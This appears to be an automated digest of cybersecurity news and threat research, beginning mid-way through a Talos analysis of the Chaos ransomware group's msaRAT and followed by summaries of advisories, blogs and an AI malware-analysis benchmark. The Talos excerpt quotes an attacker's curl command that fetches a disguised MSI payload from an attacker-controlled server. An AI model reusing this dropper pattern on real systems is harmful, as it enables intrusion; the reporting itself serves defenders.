February 2025. Although the number of listings on their data leak site remains relatively low, the group consistently targets large organizations and employs double extortion tactics. For initial access, they rely on spam emails and voice-based social engineering, commonly known as vishing. Once inside a network, their traditional post-compromise methodology involves abusing remote monitoring and management (RMM) tools to establish persistent access, while leveraging legitimate file-sharing software to exfiltrate data. For a detailed breakdown of their tactics, techniques, and procedures (TTPs), please refer to our previous blog. Figure 1. Chaos ransomware leak site. Infection chain Talos has identified a new Rust-based RAT used by the Chaos ransomware group, which we have named msaRAT. The name is derived from the binding names found in the binary (“msaOpen,” “msaClose,” “msaError,” “msaMessage”), as detailed in a later section. Figure 2 illustrates the end-to-end infection chain, from initial compromise through to the establishment of C2 communications via this RAT. Figure 2. Infection chain. After gaining access to a victim machine but prior to executing the ransomware, the attacker runs the following curl command to download an MSI file named “update_ms.msi” from an attacker-controlled server to the ProgramData directory on the victim machine, then executes it. Although port 443 is specified, the communication occurs over plain HTTP. In environments where firewall rules permit traffic based solely on port number without protocol inspection, this traffic will pass through undetected. curl.exe http://172.86.126.18:443/update_ms.msi -o C:\programdata\update_ms.msi The property information of this installer, which extracts the DLL file containing the RAT payload, contains details configured to impersonate a Windows update. Figure 3. Properties of “update_ms.msi” When this MSI file is executed, the custom action CA_Run_EA2AEBC3 is triggered upon completion of InstallFinalize . This custom action loads lib.dll, embedded in the MSI file's Binary table as Bin_lib_EA2AEBC3 , directly into memory. Figure 4. Structure of the MSI file. lib.dll (msaRAT) msaRAT is written in Rust and implemented using the asynchronous runtime Tokio. Its primary capabilities include browser-leveraged reverse shell and covert tunneling to establish communications with a C2 server. The export table of “lib.dll” exposes a function named RUN , which is designed to be called by the installer described above. Based on the actual logs, after downloading this malware, we have confirmed the existence of a ransom note. Tokio runtime initialization Tokio is a runtime for exec
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
  - Published: 2026-07-23T10:00:38+00:00
  - Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
  - Summary: The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.

### Cluster 8013169017 — score 11

- Title: Risky Bulletin: Hacker wipes Romania's entire land registry database
- Source: Risky Business News (practitioner_analysis)
- Published: 2026-07-20T05:22:45+00:00
- Link: https://risky.biz/RBNEWS589/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
A hacker wipes Romania’s entire land registry database, Magnet Forensics sues a former employee for leaking an iPhone exploit, an autonomous AI agent hacked Hugging Face, and an unauthenticated remote code execution bug was finally found in WordPress.
```

#### Full body

```
Risky Bulletin Podcast July 20, 2026 Risky Bulletin: Hacker wipes Romania's entire land registry database Presented by Catalin Cimpanu News Editor Claire Aird Newsreader A hacker wipes Romaniaâs entire land registry database, Magnet Forensics sues a former employee for leaking an iPhone exploit, an autonomous AI agent hacked Hugging Face, and an unauthenticated remote code execution bug was finally found in WordPress. Your browser does not support the audio element. Risky Bulletin: Hacker wipes Romania's entire land registry database â¶ 0:00 / 9:03 Subscribe Brought to you by Thinkst Know. When it Matters! Show notes Risky Bulletin: Hacker wipes Romania's entire land registry database
```

#### Corroborating sources (1)

- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: Hacker wipes Romania's entire land registry database
  - Published: 2026-07-20T05:22:45+00:00
  - Link: https://risky.biz/RBNEWS589/
  - Summary: A hacker wipes Romania’s entire land registry database, Magnet Forensics sues a former employee for leaking an iPhone exploit, an autonomous AI agent hacked Hugging Face, and an unauthenticated remote code execution bug was finally found in WordPress.

### Cluster de2a131113 — score 10

- Title: Real world incident response: Microsoft and AXA XL strengthen cyber resilience
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-07-22T16:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/07/22/real-world-incident-response-microsoft-and-axa-xl-strengthen-cyber-resilience/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_industries: legal_professional
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_industries: legal_professional
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Our collaboration with AXA XL brings Microsoft Incident Response services directly to cyber insurance policyholders, helping organizations coordinate technical, business, and insurance decisions. The post Real world incident response: Microsoft and AXA XL strengthen cyber resilience appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Cyber incidents don’t wait—and effective response can’t either. In the age of AI where cyber incidents unfold at machine speed, having the right partnerships in place becomes paramount. While AI is expanding what’s possible, navigating this transformation can be challenging to do alone. That’s why our collaboration with AXA XL is so important—bringing Microsoft Defender Experts Cybersecurity Incident Response services directly to cyber insurance policyholders at the moment it matters most, helping organizations coordinate technical, business, and insurance decisions in parallel rather than in sequence. Get started with Microsoft Defender Experts Cybersecurity Incident Response This collaboration reflects Microsoft’s continued investment in building an incident response model designed for real-world conditions, where speed, trust, and alignment matter as much as technology. In a live incident, security, executive, legal, and insurance teams are all acting at once. Without pre-established coordination, those parallel efforts can slow containment and increase risk. Our approach to incident response—and our work with AXA XL —starts by aligning those paths before a crisis begins. For example, during a ransomware incident, security teams may be actively containing lateral movement while leadership evaluates operational impact, legal teams assess disclosure requirements, and insurers determine coverage pathways—all within the same window of time. When those decisions aren’t aligned, response slows and risk compounds. Decades of supporting customers through high-stakes cyber incidents have reinforced a clear truth: effective incident response extends beyond technical execution. It requires coordination across teams and partners before the crisis hits. That experience continues to shape how we design Defender Experts Cybersecurity Incident Response—and how we work with partners like AXA XL. Incident response must extend beyond technology As a global insurance provider, AXA XL plays a critical role in helping organizations navigate cyber risk and response. Through this collaboration, AXA XL policyholders gain coordinated access to Microsoft’s dedicated incident response teams—combining threat containment, restoration, and recovery with insurance, legal, and regulatory workflows. By aligning AXA XL’s cyber insurance capabilities with Defender Experts Cybersecurity Incident Response, organizations benefit from a more integrated response model while gaining access to incident response teams informed by Microsoft Threat Intelligence and two decades of experience responding to some of the world’s most complex and consequential cyber incidents. Previously, organizations often brought incident responders and insurers together in the middle of a crisis. With this collaboration, that relationship is already in place, reducing friction, delays, and uncertainty when time is most critical. AXA XL policyholders and Microsoft customers can now bring Defender Experts Cybersecurity Incident Response to the table the moment it matters—creating a clearer, more predictable path from detection to recovery. The outcome is not simply faster response, but confidence: knowing who to call, how response engages, and how recovery is operationalized before the next decision becomes urgent. The threat of a cybersecurity incident has long been ‘not if, but when,’ and in the wake of AI, the ‘when’ may quickly become ‘how often.’ The risks organizations are tasked with preventing and overcoming relative to cybersecurity and data privacy are growing exponentially. Partnering with experts can make all the difference where resilience in the face of adversity may be your only saving grace. AXA XL’s strategic partnerships with cyber incident response providers underscore our commitment to expertise, preparedness, and resilience. By drawing on a deep knowledge of internal expertise and external cyber specialists, we empower our insureds to re
```

#### Corroborating sources (1)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Real world incident response: Microsoft and AXA XL strengthen cyber resilience
  - Published: 2026-07-22T16:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/22/real-world-incident-response-microsoft-and-axa-xl-strengthen-cyber-resilience/
  - Summary: Our collaboration with AXA XL brings Microsoft Incident Response services directly to cyber insurance policyholders, helping organizations coordinate technical, business, and insurance decisions. The post Real world incident response: Microsoft and AXA XL strengthen cyber resilience appeared first on Microsoft Security Blog .

### Cluster 7200b1bf11 — score 10

- Title: Sol Searching | Can Frontier Models Tackle Autonomous Long-Horizon Malware Analysis?
- Source: SentinelOne Labs (threat_research_primary)
- Published: 2026-07-22T16:55:29+00:00
- Link: https://www.sentinelone.com/labs/frontier-models-tackle-autonomous-long-horizon-malware-analysis/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- affected_products: Linux kernel, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: government
- affected_products: Linux kernel, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
A real-world benchmark tests whether powerful AI models can keep an investigation trustworthy when new evidence invalidates their conclusions.
```

#### Full body

```
AI Research Sol Searching | Can Frontier Models Tackle Autonomous Long-Horizon Malware Analysis? Juan Andrés Guerrero-Saade & Gabriel Bernadett-Shapiro / July 22, 2026 Executive Summary SentinelLABS developed a multi-stage reverse-engineering benchmark for the latest generation of frontier models by recreating our recent investigation of fast16 , a unique 2005 sabotage implant. Most AI benchmarks test bounded tasks. This benchmark tests whether a model can keep a malware investigation trustworthy as new evidence repeatedly invalidates its earlier conclusions. OpenAI’s GPT-5.6 Sol was the only publicly available model to complete the full eight-stage investigation, giving concrete shape to what ‘Frontier-class’ capabilities offer analysts. GPT-5.5, GLM-5.2, and the Opus 4.x family produced capable local analysis but could not carry it through the gradient. What distinguished the completed runs was project-scale recovery: withdrawing contradicted conclusions, repairing technical artifacts, and updating dependent reporting without losing the investigation. Senior reverse engineers remain essential. Even the strongest runs made semantic errors, accepted weak quality controls, and claimed readiness prematurely. We assess the best current use as supervised investigative agency, with human analysts defining objectives, exposing blind spots, and retaining final publication authority. Beyond Vulnerability Discovery Since ChatGPT arrived in late 2022, we have been bullish on what large language models could do for reverse engineering and malware analysis. The early models were useful for teaching but too rudimentary for production work; that changed with the advent of reasoning models. OpenAI’s o1-preview, in September 2024, was the first to show the kind of sustained problem-solving the work demands, and within months Sean Heelan had used o3 to find a net-new vulnerability in the Linux kernel . In cybersecurity, though, our understanding of what these models can do remains stovepiped to vulnerability discovery. The frontier labs took on vulnerability discovery deliberately, because that competency keeps agentic code generation from quietly shipping vulnerable code at scale. OpenAI built Aardvark, since folded into Codex; Google DeepMind announced Big Sleep, available internally to its Project Zero researchers; and Anthropic followed with selective access to Mythos Preview. Concerns that these capabilities could be misused have led the labs to stricter guardrails and ‘know your customer’ style controls that limit access to specific capabilities, or to entire model variants. OpenAI’s Daybreak initiative and its Trusted Access Program opened a dedicated variant, GPT-5.*-cyber-preview, with guardrails relaxed for cybersecurity use cases, while Anthropic’s Glasswing initiative and its Cyber Verification Program provided early access to Mythos Preview and the promise of lesser guardrails respectively. For a short period in mid-June 2026 access to the highest-end flagship models from both providers required some form of U.S. government clearance. At the time of writing, GPT 5.6 Sol is widely available, while Mythos 5 still requires clearance and access as a Glasswing partner. The existence of this new class of models left us with an unusual task: benchmarking what these models can actually do on the work defenders care about, and assessing whether they live up to the surrounding hype. If they do, we have to reckon with what that means for malware analysis and reverse engineering, disciplines that until now have been limited mostly by how little expertise exists relative to the collective need. A Benchmark Built From a Real Investigation We recently published our research on fast16 , a 2005 Windows toolkit built to sabotage high-precision solvers used to model nuclear-weapons behavior. The sample provided an ideal test case because its layered design punishes shallow analysis. On the surface, svcmgmt.exe appears to be a Windows service implant
```

#### Corroborating sources (1)

- **SentinelOne Labs** (threat_research_primary)
  - Title: Sol Searching | Can Frontier Models Tackle Autonomous Long-Horizon Malware Analysis?
  - Published: 2026-07-22T16:55:29+00:00
  - Link: https://www.sentinelone.com/labs/frontier-models-tackle-autonomous-long-horizon-malware-analysis/
  - Summary: A real-world benchmark tests whether powerful AI models can keep an investigation trustworthy when new evidence invalidates their conclusions.

### Cluster 574ebfebeb — score 10

- Title: UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations
- Source: NCSC UK (government_authoritative)
- Published: 2026-07-23T12:00:00+00:00
- Link: https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng
- affected_industries: critical_infrastructure, education, government
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage
- affected_industries: government, critical_infrastructure, education
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign
```

#### Full body

```
News Download & print article PDF Download & print article PDF UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign Russian state-supported actors develop new technique to target Western email platforms and gain persistent access to compromised networks Organisations provided with trusted advice and support to protect sensitive data in the face of evolving cyber threats Russian state-supported cyber actors have targeted Western organisations with a malicious campaign which uses a zero-click exploit coined “beehive” (or “ Ulej ”) to steal emails, the UK has warned. Today, the National Cyber Security Centre – a part of GCHQ – alongside cyber security agencies in 15 countries, has exposed activities of LAUNDRY BEAR, an advanced persistent threat group who specialise in the covert acquisition of email data. Since July 2025, LAUNDRY BEAR has successfully targeted and stolen sensitive email information from organisations that use Zimbra Collaboration Suite (ZCS) software. US organisations have been targeted in sectors including defence, government, education, energy, law enforcement, media, NGOs and technology. In a new joint advisory , the NCSC and partners warn LAUNDRY BEAR’s ongoing campaign is indicative of espionage and almost certainly carried out with Russian state support. Unlike traditional phishing campaigns, “beehive” allows the threat actors to gain extensive and sustained access to emails without requiring a user’s input. Instead of clicking a link or opening a file, the user only has to view a malicious email within a vulnerable version of the ZCS webmail service to be compromised. Organisations that use ZCS are urged to follow the mitigation advice, including to immediately patch vulnerabilities and improve network monitoring capabilities. The cyber agencies caution that it is likely “beehive” could be adapted to exploit other vulnerabilities. As more organisations update their ZCS software, it is very likely that the group will also look to target other email systems that Western organisations use. The NCSC recommends all UK organisations should sign up to the free Early Warning service for malicious network activity notifications. The government is committed to raising cyber resilience across the UK to protect businesses and safeguard growth. Earlier this month, businesses from every corner of the British economy joined a pledge publicly committing to strengthen their defences in the face of a fast-evolving threat. Today’s action shows we’re working hand-in-hand with our allies to expose Russian state-supported hackers targeting Western organisations. It’s particularly concerning that these thugs tested their methods on victims in Ukraine, before targeting members of NATO. Organisations across the UK should sign up to NCSC’s Early Warning service to ensure they can quickly secure their systems against similar activity. Security Minister, Dan Jarvis MBE This phishing campaign demonstrates how hostile actors will ruthlessly adapt techniques and exploit vulnerable technology in pursuit of their aims to steal sensitive information from Western organisations. With our international partners, we strongly encourage organisations to familiarise themselves with the ‘zero-click’ techniques described in the advisory which could be used against other platforms, and act on the mitigation advice. We will continue to call out malicious cyber activity supported by the Russian state and urge everyone to follow NCSC guidance to raise resilience, including steps to strengthen online account security. Beth Hopkins CMG, NCSC Chief Operating Officer The advisory highlights how these malicious cyber techniques were extensively trialled on Ukrainian victims before use against members of NATO, which is part of a growi
```

#### Corroborating sources (1)

- **NCSC UK** (government_authoritative)
  - Title: UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations
  - Published: 2026-07-23T12:00:00+00:00
  - Link: https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign
  - Summary: GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign

### Cluster 57268d1ce0 — score 10

- Title: When the "Autonomous Attacker" Is Your Own AI Model, (Thu, Jul 23rd)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-07-23T13:40:27+00:00
- Link: https://isc.sans.edu/diary/rss/33180
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Two disclosures, five days apart, described the same intrusion from opposite ends â€” one from the victim, one from the party that turned out to be responsible â€” and together they make one of the more instructive incidents of the year for defenders.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: When the "Autonomous Attacker" Is Your Own AI Model, (Thu, Jul 23rd)
  - Published: 2026-07-23T13:40:27+00:00
  - Link: https://isc.sans.edu/diary/rss/33180
  - Summary: Two disclosures, five days apart, described the same intrusion from opposite ends â€” one from the victim, one from the party that turned out to be responsible â€” and together they make one of the more instructive incidents of the year for defenders.

### Cluster 1042e88cd6 — score 10

- Title: US Military Smartphones Targeted Through Roaming and Ad Tech
- Source: Citizen Lab (threat_research_primary)
- Published: 2026-07-17T18:18:20+00:00
- Link: https://citizenlab.ca/us-military-smartphones-targeted-through-roaming-and-ad-tech/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: financial_services, telecommunications
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: financial_services, telecommunications
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Senior research fellow Gary Miller spoke to Financial Times about attempts to exploit mobile network vulnerabilities to track US personnel during the Iran war. The post US Military Smartphones Targeted Through Roaming and Ad Tech appeared first on The Citizen Lab .
```

#### Full body

```
Date Published July 17, 2026 Topics Targeted Surveillance advertising intelligence , telecommunications Mentions Gary Miller Share Senior research fellow Gary Miller spoke to Financial Times about attempts to exploit mobile network vulnerabilities to track US personnel during the Iran war. “Iran absolutely has capabilities to get real-time, immediate, and continuous location information,” he said. “It would surprise me very much if Iran were not using SS7, or mobile network access in the region, to track US users.” According to Miller, at least some of the tracking attempts can be linked to an Iranian mobile phone operator. “This appears to be very specific user targeting,” he said. Read more More in: Targeted Surveillance LATEST We found that former Member of the European Parliament Stelios Kouloglou was hacked with Pegasus spyware while serving on the PEGA committee, which investigated Pegasus and other spyware abuses in Europe. Through forensic analysis of his device, we found that the attackers could have had access to confidential documents and committee deliberations. July 3, 2026 Targeted Surveillance News + Updates → In the Media WhatsApp Accuses NSO of Fresh Pegasus Targeting JUNE 19, 2026 News + Updates → In the Media How Freedom Tech Is Pushing Back Against Digital Authoritarianism JUNE 17, 2026 News + Updates → In the Media Spying Via Your Mobile Phone Companies Can Locate Any Device at Any Time JUNE 15, 2026
```

#### Corroborating sources (1)

- **Citizen Lab** (threat_research_primary)
  - Title: US Military Smartphones Targeted Through Roaming and Ad Tech
  - Published: 2026-07-17T18:18:20+00:00
  - Link: https://citizenlab.ca/us-military-smartphones-targeted-through-roaming-and-ad-tech/
  - Summary: Senior research fellow Gary Miller spoke to Financial Times about attempts to exploit mobile network vulnerabilities to track US personnel during the Iran war. The post US Military Smartphones Targeted Through Roaming and Ad Tech appeared first on The Citizen Lab .

### Cluster 9df0a945fb — score 10

- Title: TAG-195 Upgrades MaaS Ecosystem with Modular Tools
- Source: Recorded Future (threat_research_primary)
- Published: 2026-07-23T00:00:00+00:00
- Link: https://www.recordedfuture.com/research/tag-195-evolves-maas-ecosystem
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, web_shell_backdoor
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: credential_theft, web_shell_backdoor
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Insikt Group identifies four new TAG-195 malware families, revealing an architectural transition toward modular, operator-driven tooling in the MaaS ecosystem
```

#### Full body

```
TAG-195 Upgrades MaaS Ecosystem with Modular Tools Executive Summary Insikt Group identified four new TAG-195 ("Golden Chickens", “Venom Spider”) malware families through ongoing tracking of the TAG-195 MaaS ecosystem. We named two of the families "TinyEgg" and “ChonkyChicken"; the third is a modularized variant of ChonkyChicken. The fourth family, which includes a modified browser credential theft helper, we named “ChromEggscalator". TAG-195 is a financially motivated malware-as-a-service (MaaS) developer whose tooling Insikt Group has previously linked to TAG-127 as an operator and customer. (Insikt Group has directly observed TAG-127 deploying TinyEgg via “ClickFix”-style campaigns that use fake security verification pages to trick victims into manually executing malicious commands that download and install malware payloads via a legitimate Windows system utility.) The four new families indicate an architectural transition and evolution in the TAG-195 MaaS ecosystem. TinyEgg is a lightweight initial-access backdoor providing host profiling, interactive shell access, and persistence management. ChonkyChicken substantially expands that capability with browser credential theft, browser session automation, credential-backed remote execution, network reconnaissance, and sustained surveillance. The modularized ChonkyChicken extends this design by introducing a controller-and-plugin architecture in which a base controller implant requests and loads discrete capability modules from attacker-controlled infrastructure on demand rather than embedding all functionality in the implant itself. TAG-195 also modified a publicly available Chrome encryption-bypass tool into a custom helper within the malware family that Insikt Group named ChromEggscalator. All four families share a common set of architectural traits: consistent command-and-control mechanisms, a shared persistence approach, string obfuscation, and execution via the same delivery model. Insikt Group assesses that TAG-195’s transition to a modular architecture almost certainly reduces the base implant's static detection exposure, and likely also reflects commercial incentives inherent to the MaaS model, including the ability to provision capabilities selectively to operators, limit exposure if a customer is compromised, and serve a broader range of operational requirements. Defenders should prioritize detection of ClickFix-style clipboard execution chains, misuse of legitimate system utilities to load payloads from user-writable directories, suspicious startup persistence mechanisms, browser processes launched with remote debugging enabled, and unusual outbound communications to attacker-controlled infrastructure. Key Findings Insikt Group identified four new TAG-195 malware families through its continued tracking of the TAG-195 MaaS ecosystem: TinyEgg, ChonkyChicken, a modularized variant of ChonkyChicken, and ChromEggscalator. Their identification indicates sustained active development and a deliberate architectural transition toward modular, operator-driven tooling. The modularized ChonkyChicken variant uses a controller-and-plugin architecture in which a base controller implant requests and loads at least fourteen capability modules on demand. Insikt Group assesses that this design almost certainly reduces the base implant's static detection footprint while enabling operators to deploy only what each intrusion requires. All four malware families share four recurring architectural traits that indicate their origin within the same TAG-195 development ecosystem: filename execution gating, Run key persistence under a consistent value name, string obfuscation, and execution via a legitimate Windows binary. Background TAG-195, also known as “Golden Chickens” or "Venom Spider", is a financially motivated MaaS developer with a long-standing history of providing credential theft and remote access tooling to criminal operators. Insikt Group assesses TAG-195 as a MaaS provider based o
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: TAG-195 Upgrades MaaS Ecosystem with Modular Tools
  - Published: 2026-07-23T00:00:00+00:00
  - Link: https://www.recordedfuture.com/research/tag-195-evolves-maas-ecosystem
  - Summary: Insikt Group identifies four new TAG-195 malware families, revealing an architectural transition toward modular, operator-driven tooling in the MaaS ecosystem

### Cluster 0ebaf42c3e — score 10

- Title: Modern Attack Vectors | Recorded Future
- Source: Recorded Future (threat_research_primary)
- Published: 2026-07-22T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/modern-attack-vectors
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion, supply_chain, zero_day
- urgency_signals: no_patch_yet, zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, credential_theft, zero_day
- urgency_signals: zero_day, no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
What is an attack vector, and how does it impact your business? Discover the top threat actor targets in 2026 and learn attack vector vs attack surface dynamics.
```

#### Full body

```
Mapping Modern Attack Vectors: What Threat Actors Are Targeting in 2026 Key Takeaways Modern threat actors have shifted from brute-forcing firewalls to compromising digital identities via stolen session cookies and credential stuffing to bypass MFA entirely Adversaries increasingly target unpatched edge infrastructure like VPNs for zero-day access while exploiting open-source repositories to launch upstream supply chain attacks Traditional internal security telemetry may miss critical pre-attack signals, making real-time, outside-in threat intelligence essential to neutralizing modern vectors before a breach occurs For today’s Chief Information Security Officers (CISOs) and security team leaders, defending your business can feel like trying to hold back the ocean. As organizations rapidly scale cloud-native infrastructure, integrate sprawling third-party ecosystems, and adopt enterprise AI workflows, most organizations' digital footprints have exploded. But a massive digital footprint isn’t the core problem. The problem is that adversaries are changing how they navigate it. Advanced persistent threats (APTs) and sophisticated cybercriminal syndicates are no longer relying on blunt-force intrusions. Instead, they are tracking organizational vulnerabilities from the outside in , using targeted methods to slip past defenses unnoticed. To stay ahead, security leaders must look past traditional, inward-facing security telemetry and think more like the adversary. That begins with a precise, real-time understanding of modern attack vectors. What is an Attack Vector? In cybersecurity, an attack vector is the specific path, route, or method an adversary uses to gain unauthorized access to a network, system, or endpoint to deliver a malicious payload or extract data. If an exploit is the lockpick, the attack vector is the hallway the intruder walked down to reach the door. Historically, attack vectors were relatively straightforward. A decade ago, an enterprise might primarily worry about phishing emails containing malicious executable attachments or unpatched, internet-facing servers. In 2026, attack vectors have evolved from isolated incidents into complex, multi-stage journeys. Modern adversaries rarely rely on a single open door. Instead, they link multiple vectors together to achieve their objectives. For example, a modern threat actor might initiate an intrusion using an automated multi-factor authentication (MFA) fatigue campaign to compromise a low-level employee identity, pivot through an exposed, undocumented API, and ultimately execute a ransomware payload via a trusted third-party software update. Attack Vector vs. Attack Surface: What’s the Difference? While they are frequently used interchangeably in security discussions, conflating your attack vectors with your attack surface can create fundamental gaps in your defensive strategy. An Attack Surface is the sum total of all potential vulnerabilities, exposure points, and digital assets across an organization’s entire footprint that an unauthorized user could try to enter or extract data from—including public cloud buckets, employee credentials, IoT devices, code repositories, and vendor networks. An Attack Vector is the specific vehicle, mechanism, or strategy used to exploit a precise point on that surface. It is the active "weapon" or method of transit chosen by the hacker. Think of your organization as a fortified castle . The attack surface is the entirety of the castle's physical structure—every wall, window, gate, and underground passage. The attack vector is the specific ladder, battering ram, or sleeping guard the invading army uses to breach a specific point on that structure. Defending the attack surface requires comprehensive visibility into what you own. Neutralizing an attack vector requires real-time intelligence on how adversaries are actively weaponizing their toolkits. What Threat Actors Are Actively Targeting in 2026 Adversary tactics are driven by efficie
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Modern Attack Vectors | Recorded Future
  - Published: 2026-07-22T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/modern-attack-vectors
  - Summary: What is an attack vector, and how does it impact your business? Discover the top threat actor targets in 2026 and learn attack vector vs attack surface dynamics.

### Cluster eeab7cc5f2 — score 10

- Title: Threat Hunting: A Guide | Recorded Future
- Source: Recorded Future (threat_research_primary)
- Published: 2026-07-20T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/cyber-threat-hunting
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: apt_espionage
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Master modern cyber threat hunting by embracing real-time threat intelligence. Discover the elite tools, steps, and frameworks to expose hidden adversaries.
```

#### Full body

```
Using Threat Intelligence to Master Modern Threat Hunting Enterprise security architectures have never been more heavily funded, yet the perimeter is functionally obsolete . Despite multi-million dollar investments in next-generation firewalls and complex defense stacks, sophisticated adversaries slip past automated boundaries every day. They don't break in; they log in, embedding themselves silently into the background noise of normal business operations. To survive in this environment, modern cyber defense teams must anchor their strategy to a single, non-negotiable rule: Assume you are already breached. Waiting for an automated alert to trigger is a losing strategy. Proactive cyber threat hunting shifts the power dynamic from reactive firefighting to active, aggressive detection. Human analysts alone cannot process the volume and velocity of data required to detect sophisticated adversaries at enterprise scale. To truly master modern threat hunting, security teams should consider enriching internal telemetry with real-time, external threat intelligence. Understanding threat hunting At its core, threat hunting is the practice of proactively and iteratively searching networks, endpoints, and cloud environments to detect and isolate advanced threats that evade existing security solutions. It is a human-led, hypothesis-driven discipline—not a purely automated feature of a software suite. Here is how it differs from other standard security functions: Threat Hunting vs. Incident Response Incident response is fundamentally reactive; it is the act of extinguishing an active, visible fire after an alert has triggered. Threat hunting is proactive, searching the architecture for hidden threats before they erupt into a catastrophic breach. Threat Hunting vs. Penetration Testing Penetration testing evaluates perimeter defenses from the outside in, evaluating whether a simulated adversary can breach the network. Threat hunting operates under the explicit assumption that the attacker is already firmly rooted inside, hunting them down from within. Threat Hunting vs. Vulnerability Assessments Vulnerability management focuses on patching open windows and updating code to prevent future exploitation. Threat hunting assumes an attacker has already gained access and focuses on detecting their lateral movement before damage is done. What teams need to begin threat hunting An effective threat hunt cannot begin in a vacuum. Before analysts can root out sophisticated threat actors, organizations must establish a baseline foundation across three core pillars: visibility, integration, and external context. 1. Visibility Threat hunting requires deep, centralized internal telemetry logs, including: Endpoint Event Logs (EDR Data) : Process execution trees, registry modifications, and local network connections. Network Traffic Analysis (NTA) : NetFlow data, DNS queries, and TLS handshake anomalies. Identity & Access Management (IAM) Logs : Cross-zone authentication spikes, anomalous MFA prompts, and privilege escalations. 2. Tool integration Relying on isolated data silos paralyzes analysts. Security teams are recommended to leverage unified SIEM and SOAR integrations to aggregate disparate data sets, normalize log schemas, and eliminate the white noise of benign network activity. 3. External intelligence Analyzing internal logs without external context is like looking at footprints in the mud without knowing what animal made them. Deep web, dark web, and technical intelligence should be required, providing the exact behavioral profiles, infrastructure layouts, and campaign contexts needed to guide the hunt. The 3 Core threat hunting methodologies 1. Hypothesis-Driven Hunting This methodology relies on a baseline understanding of an organization's unique threat profile. Rather than chasing random anomalies, hunters form educated, structured theories based on environmental risk. For example: "If an advanced persistent threat (APT) targets our specific fin
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
